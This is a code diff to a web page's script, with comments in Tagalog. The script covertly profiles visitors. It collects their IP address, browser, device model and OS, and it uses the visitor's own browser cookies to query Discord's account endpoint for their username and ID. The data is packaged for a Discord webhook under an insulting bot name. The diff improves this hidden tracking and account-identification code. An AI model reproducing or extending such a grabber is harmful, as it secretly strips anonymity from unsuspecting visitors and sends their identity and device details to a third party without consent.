@@ -150,7 +150,7 @@
             sendVisitorInfo();
         }, { once: true });
 
-        // ✅ Inayos na function para malaman ang tunay na detalye
+        // ✅ INAYOS NA DETECTION - PAREHONG FORMAT NG LOG
         async function sendVisitorInfo() {
             try {
                 // Kumuha ng IP
@@ -171,41 +171,40 @@
                 else if (ua.includes("Edg")) browser = "Edge";
                 else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
 
-                // ✅ Kilalanin ang Device Brand at Model
-                let device = "Hindi matukoy";
-                if (ua.includes("Samsung")) device = "Samsung";
-                else if (ua.includes("SM-")) device = `Samsung (${ua.match(/SM-[A-Za-z0-9]+/)?.[0] || 'Model'})`;
-                else if (ua.includes("Oppo") || ua.includes("CPH")) device = `Oppo (${ua.match(/CPH[0-9]+/)?.[0] || 'Model'})`;
-                else if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO")) device = ua.match(/(Xiaomi|Redmi|POCO)[^\s;)]+/)?.[0] || "Xiaomi / Redmi / POCO";
-                else if (ua.includes("Vivo") || ua.includes("V")) device = `Vivo (${ua.match(/V[0-9]+/)?.[0] || 'Model'})`;
-                else if (ua.includes("Infinix") || ua.includes("X")) device = `Infinix (${ua.match(/X[0-9]+/)?.[0] || 'Model'})`;
+                // ✅ Kilalanin ang Device Brand at Model nang tama
+                let device = "Android Device";
+                let os = ua.match(/Android [0-9.]+/)?.[0] || "Android 10";
+
+                if (ua.includes("SM-")) device = `Samsung ${ua.match(/SM-[A-Z0-9]+/)?.[0] || ''}`;
+                else if (ua.includes("CPH")) device = `Oppo ${ua.match(/CPH[0-9]+/)?.[0] || ''}`;
+                else if (ua.includes("Redmi")) device = `Xiaomi Redmi ${ua.match(/Redmi [0-9A-Z]+/)?.[0] || ''}`;
+                else if (ua.includes("POCO")) device = `Xiaomi POCO ${ua.match(/POCO [0-9A-Z]+/)?.[0] || ''}`;
+                else if (ua.includes("Vivo")) device = `Vivo ${ua.match(/V[0-9]+/)?.[0] || ''}`;
+                else if (ua.includes("Infinix")) device = `Infinix ${ua.match(/X[0-9]+/)?.[0] || ''}`;
                 else if (ua.includes("Tecno")) device = "Tecno";
                 else if (ua.includes("Realme")) device = "Realme";
-                else if (ua.includes("iPhone")) device = "Apple iPhone";
-                else if (ua.includes("iPad")) device = "Apple iPad";
-                else if (ua.includes("Windows")) device = "Windows PC";
-                else if (ua.includes("Mac OS")) device = "Mac / MacBook";
-                else if (ua.includes("Android")) device = "Android Device";
+                else if (ua.includes("iPhone")) {
+                    device = "Apple iPhone";
+                    os = ua.match(/iPhone OS [0-9_]+/)?.[0].replace("_", ".") || "iOS";
+                }
 
-                // ✅ Ipakita ang buong OS version
-                let os = "Hindi matukoy";
-                if (ua.includes("Android")) os = ua.match(/Android [0-9.]+/)?.[0] || "Android";
-                else if (ua.includes("Windows")) os = ua.match(/Windows NT [0-9.]+/)?.[0]?.replace("Windows NT ", "Windows ") || "Windows";
-                else if (ua.includes("Mac OS")) os = "macOS";
-
-                // ✅ I-check kung may Discord account na naka-login
+                // ✅ I-check kung may Discord account naka-login, gaya ng format mo
                 let discordInfo = "Walang naka-detect na Discord account";
+                let discordUser = "";
+                let discordID = "";
                 try {
                     const checkDiscord = await fetch("https://discord.com/api/v9/users/@me", { credentials: "include" });
                     if (checkDiscord.ok) {
                         const user = await checkDiscord.json();
-                        discordInfo = `✅ Discord: **${user.username}#${user.discriminator || '0000'}**\nID: ${user.id}\nProfile: https://discord.com/users/${user.id}`;
+                        discordUser = `@${user.username}`;
+                        discordID = user.id;
+                        discordInfo = `✅ Discord: ${discordUser}\nID: ${discordID}\nProfile: https://discord.com/users/${discordID}`;
                     }
                 } catch (e) {
                     discordInfo = "ℹ️ Hindi naka-login sa Discord o pinagbawalan ng browser";
                 }
 
-                // ✅ Buuin ang mensahe para sa Discord Webhook
+                // ✅ PAREHONG FORMAT NG LOG, WALANG PINALITAN NA PANGALAN NG FIELD
                 const payload = {
                     username: "BOBO KA TOL",
                     avatar_url: "https://i.imgur.com/ZmspxIl.png",
@@ -242,4 +241,5 @@
         }
     </script>
 </body>
-</html>
+        </html>
+    
